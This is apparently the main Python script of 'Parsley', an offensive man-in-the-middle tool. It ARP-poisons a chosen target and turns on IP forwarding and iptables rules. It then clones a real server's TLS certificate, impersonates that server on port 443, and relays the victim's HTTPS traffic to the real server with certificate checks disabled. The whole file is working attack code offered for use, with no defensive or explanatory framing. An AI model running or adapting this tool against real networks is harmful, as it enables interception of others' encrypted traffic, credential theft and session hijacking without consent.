import socket
from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR, SHUT_WR, IPPROTO_IP

import os
import errno

import netifaces as ni
import threading
import traceback
import ssl
import time
import logging

from argparse import ArgumentParser

import OpenSSL
from OpenSSL import crypto, SSL
from os.path import exists, join
from io import open

from scapy.all import *

from utils import *
from connection import *
from cert import *
import arp_spoof

KEYFILE = 'server_key.pem'
CERTFILE = 'server_cert.pem'
PORT = 443
CONN = 5

version = 0.01
banner="""\n
 ____                _            
|  _ \ __ _ _ __ ___| | ___ _   _ 
| |_) / _` | '__/ __| |/ _ \ | | |
|  __/ (_| | |  \__ \ |  __/ |_| |
|_|   \__,_|_|  |___/_|\___|\__, |
                            |___/ 
	Parsley v{}\n
by:Dan00bie\n\n""".format(version)

# parse command line
def set_configs():
	parser = ArgumentParser()

	parser.add_argument ( "-t", "--target", required=True, type=str, help="The target IP" )
	parser.add_argument ( "-s", "--server", required=True, type=str, help="The server IP to spoof" )
	parser.add_argument ( "-i", "--interface", required=True, type=str, help="The interface to use" )

	# parse command line
	args = parser.parse_args()
	'''
	answer = args.square**2
	if args.verbosity == 2:
		print("the square of {} equals {}".format(args.square, answer))
	elif args.verbosity == 1:
		print("{}^2 == {}".format(args.square, answer))
	else:
		print(answer)

	print (args.echo)
	'''
	
	conf = { 
		'target' : {
			'ip':args.target,
			'mac':ip_to_mac(args.target,args.interface),
		},
		'server' : {
			'ip':args.server,
			'mac':ip_to_mac(args.server,args.interface),
		},
		'mitm' : {
			'ip': ni.ifaddresses(args.interface)[ni.AF_INET][0]['addr'],
			'mac': ni.ifaddresses(args.interface)[ni.AF_LINK][0]['addr'],
		},
		'interface' : args.interface
	}
	logging.info(conf)
	return conf

def end( configs ):
	logging.info ( "[*] Disabling ip forwarding..." )
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	logging.info ( "[*] Cleaning iptables rules..." )
	iptables_clean()

def start( configs ):
	time.sleep(0.1)
	try:
		print ( banner )
		
		logging.info ( "[*] Enabling ip forwarding..." )
		# sysctl -w net.ipv4.ip_forward=1
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		
		logging.info ( "[*] Adding iptables rules..." )
		iptables_accept( configs )

		logging.info ( "[*] Cloning server certificate..." )
		cert = get_cert_from_endpoint ( configs['server']['ip'] )
		
		if ( cert != None ): 
			cn = clone_certificate ( cert )
			a = cn + "_cert.pem"
			b = cn + "_key.pem"
			configs.update( {'cert':a,'key':b} )

		spoof_server( configs )
		# spoof_gateway( configs )
		
		end( configs )

	except KeyboardInterrupt:
		end( configs )
		raise
		
	except Exception as e:# Any other error
		logging.error ("\n[!] Unexpected error in executing program:", exc_info=True )
		#logging.error (traceback.format_exc())
		end( configs )
		
def spoof_server ( configs ):
	try:
		# socket for the mitm, it will fake server and listen for client connections
		m = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )

		m.bind((configs['mitm']['ip'],PORT))
		
		# ssl_version=ssl.PROTOCOL_SSLv23 ssl.PROTOCOL_TLS
		if ( PORT == 443 ):
			m = ssl.wrap_socket ( m, server_side = True, keyfile=configs['key'], certfile=configs['cert'], do_handshake_on_connect=True, ssl_version=ssl.PROTOCOL_SSLv23 )
			m.listen(CONN)
		else:
			m.listen(CONN)

		logging.info ("[*] Listening on port {}..".format (PORT) )
		
		while True:
			try:
				# server socket, it opens a communication with real server
				s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
				
				logging.debug("\n-------------------------------")
				logging.debug("[*] Connecting to server...")
				if ( PORT == 443 ):
					logging.debug("[*] Doing TLS handshake...")
					s = ssl.wrap_socket ( s, server_side=False, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE )
					s.connect(( configs['server']['ip'], PORT)) # connecting using 202 source IP
				else:
					s.connect (( configs['server']['ip'], PORT))
				logging.debug( "[*] [{}] Connection enstablished!".format(time.asctime( time.localtime(time.time()) )) )

				# https://issues.apache.org/jira/browse/THRIFT-4274
				c = None
				c, addr = m.accept() # it can fail when client noticed some problems such SSL certificate errors

				'''
				Your certificate contains the same serial number as another certificate issued by the certificate authority. Please get a new certificate containing a unique serial 						number. Error code: SEC_ERROR_REUSED_ISSUER_AND_SERIAL
				solution avoid different certificates with same sequence number and subject ( new cert from same subject means different updated SN )
				'''
				logging.debug ("\n[*] [{}] Received connection from: {}".format(time.asctime( time.localtime(time.time()) ), addr))

				handle_connection ( c, s )
				#handle_connection_stream ( c, s )

				logging.debug ("[*] [{}] Closing connection with server...".format(time.asctime( time.localtime(time.time()) )))

				# If how is SHUT_RD, further receives are disallowed. If how is SHUT_WR, further sends are disallowed. If how is SHUT_RDWR, further sends and receives are disallowed.
				logging.debug("[!] Closing server connection socket...")
				close_socket ( s )
				if ( c!=None ):
					logging.debug ("[*] [{}] Closing connection with client...".format(time.asctime( time.localtime(time.time()) )))
					logging.debug("[!] Closing accepted client socket...")
					close_socket ( c )
				logging.debug("-------------------------------")
			except socket.error as e:
				# if error is 0 means client closed connection and i only need to relisten and stay cool, failed to accept connection, because 
				# kernel is trying to write on non existing file because ssl close the socket and OS tries to write on it
				if ( e.errno == 0 ): # self._sslobj.do_handshake() fail ---> client will send warning or error or close connection directly
					logging.error ("[!] It seems the client closed the connection! ReListening...")
					
					logging.debug("[!] Closing connected server socket...")
					close_socket ( s )
					continue
				if ( e.errno == 107 ):# s.shutdown( SHUT_RDWR ) ---> OSError: [Errno 107] Transport endpoint is not connected ---> it sends a FIN to endpoint but is closed ( RST )
					logging.error ("[!] It seems the server closed the connection! ReConnecting..." )
					if ( c != None ):
						logging.debug("[!] Closing accepted client socket...")
						
						c.close()
					s.close() # i dont need shutdown
					continue
				else: # could be connect to server error, socket creation for server error, error in accept by client, error in shutdowns and close
					# ssl.SSLError
					logging.error ("\n[!] Unexpected socket error! Parsley will close now..:", exc_info=True )
					
					end( configs )
					if ( c != None ):
						logging.debug("[!] Closing accepted client socket...")
						close_socket ( c )
					logging.debug("[!] Closing listening mitm socket...")
					close_socket ( m )
					
					break # this will kill parsley
			except KeyboardInterrupt:
				
				s.close()
				
				if ( c != None ): c.close()
				raise

	except KeyboardInterrupt:
		
		m.close()
		raise

	except socket.error as v: # as python3 --> , python2
		# there could be many different socket errors 
		logging.error ("\n[!] Error in creating mitm socket:", exc_info=True )
		
		end( configs )

def gateway_forward ( configs ):
	def sniff( packet ):
		print ( "RECEIVED:\n",packet.show() )
		'''
		i received a packet that gateway should have.. I must simple reforward to gw using scapy --> this bypass kernel
		'''
		# change destination mac ----> must recalculate checksum and stuff? I GUESS SO
		packet[Ether].dst = configs['server']['mac']
		print ( "MODIFIED:\n",packet.show() )
		srp1( packet, iface=configs['interface'] ) # send packet at L3 da fuck dus that mean
	return sniff

def spoof_gateway( configs ):

	#command = "iptables -t nat -A PREROUTING -d "+configs['server']['ip']+" -j DNAT --to "+configs['mitm']['ip']
	#os.system( command )
	fil = "tcp and port 443 and src host " + configs['target']['ip']
	print (fil)
	#packet=sniff(iface=configs['interface'],filter=fil, prn=lambda x:x.sprintf("{IP:%IP.src% (%Ether.src%)\t--->\t%IP.dst% (%Ether.dst%):\t%TCP.sport%\t--->\t%TCP.dport%}" ) )
	packet=sniff(iface=configs['interface'],filter=fil, prn=gateway_forward( configs )  )

def main():
	try:
		configs = set_configs()
		#logging.info ( configs['target']['ip'] )
		arp = threading.Thread( target=arp_spoof.poison, args=[ configs['target']['ip'], configs['target']['mac'], configs['server']['ip'], configs['mitm']['mac'] ] )  
		arp.setDaemon(True)
		arp.start() #ARP spoofing

		start( configs )
	except KeyboardInterrupt:
		logging.info ("\n[!] Ctrl+C: closing program")
		logging.info ("\n[*] Antitode target..")
		arp_spoof.antitode( configs['target']['ip'], configs['target']['mac'], configs['server']['ip'], configs['server']['mac'] )

if __name__ == '__main__' :
	if os.geteuid() != 0:
		sys.exit("[!] Program must be runned as root! Exiting...")

	# formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
	logging.basicConfig ( level=logging.DEBUG, format='%(message)s' )
	#logger = logging.getLogger( __name__ )
	#logging.info("tryout")

	'''
	logger = logging.getLogger(__name__)
	logger.setLevel(logging.INFO)

	# create a file handler
	handler = logging.FileHandler('hello.log')
	handler.setLevel(logging.INFO)

	# create a logging format
	formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
	handler.setFormatter(formatter)

	# add the handlers to the logger
	logger.addHandler(handler)

	logger.info('Hello baby')
	'''
	main()
